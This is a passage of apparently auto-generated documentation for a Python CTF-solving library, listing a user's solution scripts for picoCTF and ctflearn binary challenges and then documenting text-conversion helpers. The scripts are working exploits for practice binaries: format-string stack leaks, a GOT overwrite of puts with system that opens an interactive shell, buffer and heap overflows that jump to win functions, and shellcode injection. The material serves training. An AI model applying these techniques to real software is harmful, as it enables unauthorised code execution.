        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def initiate_connection(self):
        # return super().initiate_connection()
        pass

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def current_initiate_connection(self):
        self.connect(self.conn_type)

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def main(self):

        # Welcome message
        for _ in range(5):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(8):
            out = self.conn.recvline()
            # print(out)

        # Options
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b&#34;Enter your choice: &#34;)
        # print(out)

        payload = b&#34;A&#34; * 32 + b&#34;pico&#34;

        self.conn.sendline(b&#34;2&#34;)

        self.conn.sendline(payload)

        print(self.conn.recvuntil(b&#34;choice: &#34;))

        self.conn.sendline(b&#34;4&#34;)

        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b&#34;1&#34;)
        self.conn.recvuntil(b&#34;What is your API token?\n&#34;)
        self.conn.sendline(b&#34;%p&#34; * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def to_hex(self, data):
        if type(data) == str:
            return &#34;&#34;.join([hex(ord(c)) for c in data])
        return &#34;&#34;.join([hex(ord(c))[2:] for c in data])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def from_hex(self, data):
        return &#34;&#34;.join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def data_processing(self, data):

        output = &#34;&#34;.join(data.split(&#34;(nil)&#34;))

        output = output.strip(&#34;0x&#34;).split(&#34;0x&#34;)
        temp = []

        for item in output:
            temp_word = &#34;&#34;
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = &#34;&#34;.join(output)
        return output

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def local_run(self):
        data = &#34;0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d&#34;
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, &#34;picoCTF&#34;)[0]
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def exploitation(self):

        self.conn = self.pwn.remote(self.url, self.port)

        for _ in range(4):
            self.conn.recvline()

        self.conn.sendline(b&#34;1&#34;)

        question = &#34;What is your API token?\n&#34;
        payload = &#34;%p&#34; * 24

        self.conn.recvuntil(question.encode())
        self.conn.sendline(payload.encode())
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def to_hex(self, data):
        if type(data) == str:
            return &#34;&#34;.join([hex(ord(c)) for c in data])
        return &#34;&#34;.join([hex(ord(c))[2:] for c in data])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def from_hex(self, data):
        return &#34;&#34;.join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def data_processing(self, data):

        output = &#34;&#34;.join(data.split(&#34;(nil)&#34;))

        output = output.strip(&#34;0x&#34;).split(&#34;0x&#34;)
        temp = []

        for item in output:
            temp_word = &#34;&#34;
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = &#34;&#34;.join(output)
        return output

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def re_match_flag(self, text: str, origin: str) -&gt; list[str]:
        &#34;&#34;&#34;
        Description:
        Find the flag in the text

        Args:
            text (str): Text to search for the flag
            origin (str): Origin of the flag

        Returns:
            str: list of flag found in the text
        &#34;&#34;&#34;
        flag_pattern = rf&#34;{origin}{{[A-Za-z0-9_]+}}&#34;
        return re.findall(flag_pattern, text)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, &#34;picoCTF&#34;)[0]
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b&#34;1&#34;)
        self.conn.recvuntil(b&#34;What is your API token?\n&#34;)
        self.conn.sendline(b&#34;%p&#34; * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def to_hex(self, data):
        if type(data) == str:
            return &#34;&#34;.join([hex(ord(c)) for c in data])
        return &#34;&#34;.join([hex(ord(c))[2:] for c in data])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def from_hex(self, data):
        return &#34;&#34;.join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def data_processing(self, data):

        output = &#34;&#34;.join(data.split(&#34;(nil)&#34;))

        output = output.strip(&#34;0x&#34;).split(&#34;0x&#34;)
        temp = []

        for item in output:
            temp_word = &#34;&#34;
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = &#34;&#34;.join(output)
        return output

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def local_run(self):
        data = &#34;0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d&#34;
        return data

        # /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, &#34;picoCTF&#34;)[0]
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def __init__(self, *args, **kwargs) -&gt; None:
        super().__init__(*args, **kwargs)
        self.prepare_space()
        # self.pwn.context.log_level = &#34;critical&#34;
        self.pwn.context.binary = self.pwn.ELF(Path(self.folder_files, self.file))
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def exec_fmt(self, payload):
        p = CTFSolver(conn=self.conn_type, file=self.file, url=self.url, port=self.port)
        p.initiate_connection()
        p.conn.sendline(payload)
        return p.conn.recvall()

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def main(self):
        print(self.conn.recvline())

        # This uses the exec_fmt, autofmt in the documentation to find the offset for the payload.
        # To find the address objump -D vuln was used on the binary executable file.
        # When searching for the function &#34;sus&#34; these lines could be seen.z

        autofmt = self.pwn.FmtStr(self.exec_fmt)
        offset = autofmt.offset
        print(f&#34;Offset: {offset}&#34;)

        payload = self.pwn.fmtstr_payload(offset, {0x404060: 0x67616C66})
        self.conn.sendline(payload)

        print(self.conn.recvall())

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def __init__(self, *args, **kwargs) -&gt; None:
        super().__init__(*args, **kwargs)

        self.prepare_space(files=[&#34;flag.txt&#34;], folder=self.folder_files)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.library = Path(self.folder_files, &#34;libc.so.6&#34;)

        self.libc = self.pwn.ELF(self.library, checksec=False)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def exec_func(self, payload):
        p = Solution(conn=&#34;local&#34;, file=self.file)
        p.initiate_connection()
        p.conn.sendline(payload)
        p.conn.recvline()
        p.conn.recvline()
        res = p.conn.recvline()
        print(res)
        return res.strip()

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def main(self):

        fmtstr = self.pwn.FmtStr(self.exec_func)
        super().initiate_connection()
        self.conn.recvuntil(&#34;libc: &#34;)
        setvbuf = int(self.conn.recvline().strip().decode(), 16)

        self.libc.address = setvbuf - 0x7A3F0

        payload = b&#34;A&#34; * fmtstr.padlen + self.pwn.fmtstr_payload(
            fmtstr.offset, {self.binary.got.puts: self.libc.symbols.system}
        )

        self.conn.sendline(payload)

        self.conn.interactive()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_0/payloads/solution.py
    def main(self):
        for _ in range(20):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        self.conn.sendline(b&#34;2&#34;)

        print(self.conn.recvuntil(b&#34;Data for buffer: &#34;))

        payload = &#34;A&#34; * 32
        print(payload)

        self.conn.sendline(payload)

        for _ in range(7):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        # # To check it
        # self.conn.sendline(b&#34;3&#34;)

        # print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        # # To check it
        # self.conn.sendline(b&#34;1&#34;)

        # print(self.conn.recvuntil(b&#34;Enter your choice: &#34;))

        self.conn.sendline(b&#34;4&#34;)

        print(self.conn.recvall())

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        self.get_parent()
        self.prepare_space()
        super().__init__(**kwargs)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def prepare_space(self):
        files = [
            &#34;secret-menu-item-1.txt&#34;,
            &#34;secret-menu-item-2.txt&#34;,
            &#34;flag.txt&#34;,
        ]
        for file in files:
            with open(Path(self.folder_payloads, file), &#34;w&#34;) as f:
                f.write(&#34;picoCTF{test}&#34;)

        # /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def main(self):
        # print(self.file)
        print(self.conn.recvline())
        self.conn.sendline(
            b&#34;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p&#34;
        )
        print(self.conn.recvline())
        print(self.conn.recvline())

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def generate_pattern(self, length=1, n=8):
        &#34;&#34;&#34;
        Generates a cyclic pattern of a given length.

        Args:
            length (int): The length of the pattern to generate.
            n (int): The number of unique characters in the pattern.

        Returns:
            str: The generated cyclic pattern.
        &#34;&#34;&#34;
        return self.pwn.cyclic(length=length, n=n)

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def find_offset(self, pattern, n=8):
        &#34;&#34;&#34;
        Finds the offset of a given pattern in the cyclic pattern.

        Args:
            pattern (str): The pattern to find the offset for.
            n (int): The number of unique characters in the pattern.

        Returns:
            int: The offset of the pattern.
        &#34;&#34;&#34;
        return self.pwn.cyclic_find(pattern, n=n)

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def main(self):
        offset = self.local_exploitation()

        # Here is a slight problem that the offset is different than the one that gef gives
        payload = b&#34;A&#34; * offset + b&#34;\xef\xbe\xad\xde&#34;

        self.remote_exploitation(payload)

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def local_exploitation(self):
        &#34;&#34;&#34;
        Performs local exploitation to find the offset.

        Returns:
            int: The offset found from the local exploitation.
        &#34;&#34;&#34;
        local = CTFSolver(conn=&#34;local&#34;, file=self.file, url=self.url, port=self.port)
        local.initiate_connection()

        # Header
        local.recv_lines(number=19, display=False)
        # Two sentence message
        local.recv_lines(number=2, display=False)

        payload = self.generate_pattern(length=300)
        print(f&#34;Pattern: {payload}&#34;)

        # Sending payload
        local.send(payload, encode=False)

        output = local.recv_lines(number=2, save=True)

        rpb = str(output[0]).replace(&#34;\\n&#34;, &#34;&#34;).split(&#34;==&#34;)[1].strip().strip(&#34;&#39;&#34;)
        print(rpb)
        crash_value = int(rpb, 16)
        offset = self.find_offset(crash_value)
        print(f&#34;Offset: {offset}&#34;)
        return offset

        # /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def remote_exploitation(self, payload):
        &#34;&#34;&#34;
        Performs remote exploitation using the given payload.

        Args:
            payload (bytes): The payload to use for remote exploitation.
        &#34;&#34;&#34;
        remote = CTFSolver(conn=&#34;remote&#34;, file=self.file, url=self.url, port=self.port)
        remote.initiate_connection()

        # Header
        remote.recv_lines(number=19, display=False)
        # Two sentence message
        remote.recv_lines(number=2, display=True)

        # Sending payload
        remote.send(payload, encode=False)

        remote.recv_lines(number=3, display=True)

        # /home/figaro/CTF/Categories/Binary/picoCTF/basic-file-exploit/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_text = &#34;&#34;
        self.menu_num = 4

        self.recv_lines(number=self.menu_num, display=True)
        self.send(&#34;1&#34;)
        self.recv_lines(number=2, display=True)
        self.send(&#34;1&#34;)
        self.recv_lines(number=2, display=True)
        self.send(&#34;1&#34;)
        self.recv_lines(number=3, display=True)
        self.send(&#34;2&#34;)
        self.recv_lines(number=2, display=True)
        self.send(&#34;0&#34;)
        self.recv_lines(number=2, display=True)

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = &#34;Enter the address in hex to jump to, excluding &#39;0x&#39;: &#34;
        self.local_preparations()
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def local_preparations(self):
        if self.conn == &#34;remote&#34;:
            return
        self.challenge_file = self.Path(self.parent, &#34;challenge&#34;, self.file)
        self.folder_challenge = self.Path(self.parent, &#34;challenge&#34;)
        self.prepare_space(
            files=[&#34;flag.txt&#34;],
            folder=self.folder_challenge,
        )

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def get_address(self, function):
        address = self.elf.symbols[function]
        # process address
        return address

        # /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def main(self):

        win_address = self.get_address(&#34;win&#34;)

        payload = str(hex(win_address)).split(&#34;0x&#34;)[1]
        self.send_menu(choice=payload)

        flag = self.recv_menu(number=3, display=True, save=True)[2]
        flag = flag.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def load_shellcode(self):
        shellcode = &#34;&#34;
        exploit_filed = self.folfil(folder=&#34;payloads&#34;, file=&#34;exploit.asm&#34;)
        with open(exploit_filed, &#34;r&#34;) as f:
            shellcode = f.read()

        shellcode = self.pwn.asm(shellcode)
        print(shellcode)

        return shellcode

        # /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def main(self):

        self.menu_num = 0
        self.menu_text = &#34;Give me code to run:&#34;
        shellcode = self.load_shellcode()
        self.initiate_connection()
        self.recv_until(&#34;run:&#34;)
        # Note: fix send to be able to send text without encoding it
        # self.send(shellcode)
        self.conn.sendline(shellcode)
        self.conn.interactive()

        # /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def get_elf_function_address(self, function):
        &#34;&#34;&#34;
        Description:
        &#34;&#34;&#34;
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

        # /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def challenge_get_offset_address(self):
        offset = self.get_elf_function_address(&#34;main&#34;) - self.get_elf_function_address(
            &#34;win&#34;
        )
        return offset

        # /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        main_function = self.recv_lines(1, display=False, save=True)[0]

        main_function = main_function.split(b&#34; &#34;)[-1].decode(&#34;utf-8&#34;).strip(&#34;\n&#34;)
        main_function = int(main_function, 16)

        win_addr = main_function - self.challenge_get_offset_address()

        menu_text = &#34;Enter the address to jump to, ex =&gt; 0x12345: &#34;
        self.recv_send(
            text=hex(win_addr), text_until=menu_text, save=True, display=True
        )

        result = self.recv_lines(3, display=True, save=True)[-1]

        flag = self.re_match_partial_flag(
            text=result.decode(&#34;utf-8&#34;), origin=&#34;picoCTF{&#34;
        )

        pyperclip.copy(flag[0])

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def __init__(self, **kwargs) -&gt; None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folder_files, test_text=&#34;picoCTF{test}&#34;
        )
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def get_address(self):
        # win = self.elf.symbols[&#34;win&#34;]
        # self.win_address = hex(win)
        self.win_address = self.elf.symbols[&#34;win&#34;]
        self.win_address = hex(self.win_address)

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def build_payload(self):
        self.payload = b&#34;A&#34; * 32
        self.get_address()
        length = len(hex(self.win_address)) - 2
        self.payload += self.pwn.p32(int(self.win_address, 16))
        self.payload += self.pwn.p32(self.win_address)
        # self.payload = self.payload[:-2]
        # self.payload += b&#34;\x40&#34;

        self.payload += struct.pack(&#34;&gt;I&#34;, self.win_address)
        self.payload = self.payload[:-2]
        self.payload += b&#34;\x40&#34;

        length = (16 - length) // 2
        for _ in range(length):
            self.payload += b&#34;\x00&#34;

        # /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def main(self):

        # self.build_payload()

        # return

        # Welcome message
        for _ in range(2):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b&#34;Enter your choice: &#34;)
        # print(out)

        self.conn.sendline(b&#34;2&#34;)

        self.conn.recvuntil(b&#34;Data for buffer: &#34;)

        # self.payload = b&#34;A&#34; * 32 + b&#34;\xa0\x11\x40\x00\x00\x00\x00\x00&#34;
        self.payload = (
            b&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00&#34;
        )
        print(self.payload)
        self.conn.sendline(self.payload)
        print(self.conn.recvuntil(b&#34;choice: &#34;))

        # self.conn.sendline(b&#34;3&#34;)
        # print(self.conn.recvuntil(b&#34;choice: &#34;))
        self.conn.sendline(b&#34;4&#34;)
        print(self.conn.recvuntil(b&#34;choice: &#34;))

        # /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_num = 0
        self.menu_text = &#34;Enter a number to add: &#34;

        # self.send_menu(9999999999999999999999, display=True)
        # self.recv_lines(1, display=True)

        self.looper()

        # /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def looper(self):
        payload = &#34;-1-1-2-3-4-5-6-7-8-9-10-11-12-13-14-15-16-17-1813-14-15-16-17-18---1&#34;
        payload = &#34;-1-1-1111111111111--11111111111111&#34;

        times = 110
        for i in range(times):
            self.send_menu(payload)
            self.recv_lines(1, display=True)
        # self.recv_lines(10, display=True)
        # self.recv_lines(1, display=True)

        # # acc = self.recv_lines(1, save=True)[0]
        # # print(acc)

        # self.send_menu(&#34;1--1&#34;)

        self.recv_lines(times, display=True)

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def main(self):
        self.prepare_space(
            files=[&#34;flag.txt&#34;], folder=self.folders[&#34;files&#34;], test_text=&#34;ctflean{test}&#34;
        )
        self.menu_text = &#34;What is your favorite format tag? &#34;
        self.menu_num = 0

        addresses = self.read_address_positions(11)
        flag = self.decode_address(addresses, 7, 11)

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def read_address_positions(self, positions):
        &#34;&#34;&#34;
        Reads the address of the stack

        Args:
            positions (int): Number of positions to read

        Returns:
            list: List of addresses
        &#34;&#34;&#34;
        # How to read a specific address
        payload = &#34;%p &#34; * positions
        output = self.simple_payload_send(payload)
        address_all = output.decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).split(&#34; &#34;)

        return address_all

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def decode_address(self, address_all, start=0, end=None):
        &#34;&#34;&#34;
        Description:
            Decodes the address of the stack

        Args:
            address_all (list): List of addresses
            start (int, optional): Starting position of the address. Defaults to 0.
            end ([type], optional): Ending position of the address. Defaults to None.

        Returns:
            bytes: Decoded text of the address
        &#34;&#34;&#34;
        decoded_text = b&#34;&#34;

        if end is None:
            end = len(address_all)

        for i in range(start, end):
            decoded_text += self.pwn.p64(int(address_all[i], 16))
        return decoded_text

        # /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def simple_payload_send(self, payload, lines=1):
        &#34;&#34;&#34;
        Description:
            Sends a simple payload to the connection

        Args:
            payload (str): Payload to send
            lines (int, optional): Number of lines to receive. Defaults to 1.

        Returns:
            bytes: Output of the connection
        &#34;&#34;&#34;
        bruter = CTFSolver(conn=&#34;remote&#34;, url=self.url, port=self.port)
        bruter.initiate_connection()
        bruter.menu_text = self.menu_text
        bruter.menu_num = self.menu_num
        bruter.send_menu(choice=payload)
        output = bruter.recv_lines(lines, save=True)

        if len(output) &gt; 0:
            return output[0]

        # /home/figaro/CTF/Categories/Binary/ctflearn/Two_Times_Sixteen/payloads/solution.py
    def main(self):
        self.initiate_connection(cwd=self.folders[&#34;data&#34;])</code></pre>
</details>
<div class="desc"><p>CTFSolver is a composite manager class designed to facilitate solving Capture The Flag (CTF) challenges.
It inherits functionality from ManagerFile, ManagerConnections, ManagerCrypto, and ManagerError, providing
a unified interface for file management, network connections, cryptographic operations, and error handling.</p>
<h2 id="attributes">Attributes</h2>
<dl>
<dt><strong><code>debug</code></strong> :&ensp;<code>bool</code></dt>
<dd>Enables or disables debug mode for verbose output.</dd>
<dt><strong><code>parent</code></strong> :&ensp;<code>str</code></dt>
<dd>The name of the parent folder (inherited from ManagerFile).</dd>
</dl>
<h2 id="methods">Methods</h2>
<p><strong>init</strong>(<em>args, </em><em>kwargs):
Initializes all ancestor classes and sets up the CTFSolver instance.
initializing_all_ancestors(</em>args, **kwargs):
Initializes all ancestor classes (ManagerFile, ManagerCrypto, ManagerConnections, ManagerError).
main():
Placeholder for the main logic of the solver. Should be implemented with challenge-specific logic.
try_main():
Executes the main function, handling exceptions and user interruptions gracefully.
<strong>str</strong>():
Returns a string representation of the CTFSolver instance, including the parent folder name.</p>
<p>Initialize the class</p></div>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="ctfsolver.src.ctfsolver.CTFSolver" href="../src/ctfsolver.html#ctfsolver.src.ctfsolver.CTFSolver">CTFSolver</a></li>
<li><a title="ctfsolver.managers.manager_file.ManagerFile" href="../managers/manager_file.html#ctfsolver.managers.manager_file.ManagerFile">ManagerFile</a></li>
<li><a title="ctfsolver.managers.manager_files_pcap.ManagerFilePcap" href="../managers/manager_files_pcap.html#ctfsolver.managers.manager_files_pcap.ManagerFilePcap">ManagerFilePcap</a></li>
<li><a title="ctfsolver.managers.manager_files_re.ManagerFileRegex" href="../managers/manager_files_re.html#ctfsolver.managers.manager_files_re.ManagerFileRegex">ManagerFileRegex</a></li>
<li><a title="ctfsolver.managers.manager_folder.ManagerFolder" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder">ManagerFolder</a></li>
<li><a title="ctfsolver.managers.manager_functions.ManagerFunction" href="../managers/manager_functions.html#ctfsolver.managers.manager_functions.ManagerFunction">ManagerFunction</a></li>
<li><a title="ctfsolver.managers.manager_connections.ManagerConnections" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections">ManagerConnections</a></li>
<li><a title="ctfsolver.managers.manager_crypto.ManagerCrypto" href="../managers/manager_crypto.html#ctfsolver.managers.manager_crypto.ManagerCrypto">ManagerCrypto</a></li>
<li><a title="ctfsolver.error.manager_error.ManagerError" href="../error/manager_error.html#ctfsolver.error.manager_error.ManagerError">ManagerError</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="ctfsolver.find_usage.gathering.Gathering.another_attempt"><code class="name flex">
<span>def <span class="ident">another_attempt</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def another_attempt(self):

    lyrics = self.load_lyrics()

    lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation = (
        self.lyric_transformation(lyrics)
    )

    print(lyrics_only_letters)
    print(lyrics_with_spaces)
    print(lyrics_without_punctuation)

    # flag = self.bruteforce(lyrics, self.key)
    # print(flag)
    # flag = self.bruteforce(lyrics_only_letters, self.key)
    # print(flag)
    flag = self.brute_transpose_find_flag(lyrics_with_spaces, self.key)
    print(flag)
    flag = self.brute_transpose_find_flag(lyrics_without_punctuation, self.key)
    print(flag)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.ascii_converter"><code class="name flex">
<span>def <span class="ident">ascii_converter</span></span>(<span>self, bits)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def ascii_converter(self, bits):
    &#34;&#34;&#34;
    Convert a string of bits to ASCII characters.
    Input bits should be in multiples of 8 (for standard ASCII).
    Handles padding if needed.
    &#34;&#34;&#34;
    # Pad with zeros if not multiple of 8
    padded_length = math.ceil(len(bits) / 8) * 8
    padded_bits = bits.ljust(padded_length, &#34;0&#34;)

    ascii_str = &#34;&#34;
    for i in range(0, len(padded_bits), 8):
        byte = padded_bits[i : i + 8]
        try:
            char = chr(int(byte, 2))
            # Only add printable ASCII characters
            if 32 &lt;= ord(char) &lt;= 126 or ord(char) in [10, 13]:
                ascii_str += char
            else:
                ascii_str += &#34;.&#34;  # Non-printable character placeholder
        except ValueError:
            ascii_str += &#34;?&#34;  # Invalid byte

    return ascii_str</code></pre>
</details>
<div class="desc"><p>Convert a string of bits to ASCII characters.
Input bits should be in multiples of 8 (for standard ASCII).
Handles padding if needed.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.ascii_converter1"><code class="name flex">
<span>def <span class="ident">ascii_converter1</span></span>(<span>self, bits:str) >str</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def ascii_converter1(self, bits: str) -&gt; str:
    # Step 2: Convert bitstream to ASCII
    ascii_text = &#34;&#34;
    for i in range(0, len(bits), 8):
        byte = bits[i : i + 8]
        if len(byte) == 8:
            ascii_text += chr(int(byte, 2))
    return ascii_text</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.ascii_rot"><code class="name flex">
<span>def <span class="ident">ascii_rot</span></span>(<span>self, text, n)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def ascii_rot(self, text, n):
    &#34;&#34;&#34;
    Description:
        Rotates the ASCII characters in a string by n positions

    Args:
        text (str): The text to rotate
        n (int): The number of positions to rotate



    &#34;&#34;&#34;
    roted_text = &#34;&#34;
    for i in text:
        ascii_str = ord(i) + n
        if ascii_str &gt; 126:
            # This is to avoid the non-printable characters
            roted_text += chr((ascii_str % 127) + 32)
        elif ascii_str &lt; 33:
            # This is to avoid the non-printable characters
            roted_text += chr(ascii_str + 33)
        else:
            roted_text += chr(ascii_str)

    return roted_text</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Rotates the ASCII characters in a string by n positions</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>text</code></strong> :&ensp;<code>str</code></dt>
<dd>The text to rotate</dd>
<dt><strong><code>n</code></strong> :&ensp;<code>int</code></dt>
<dd>The number of positions to rotate</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.attempt_for_loop_subkeys"><code class="name flex">
<span>def <span class="ident">attempt_for_loop_subkeys</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
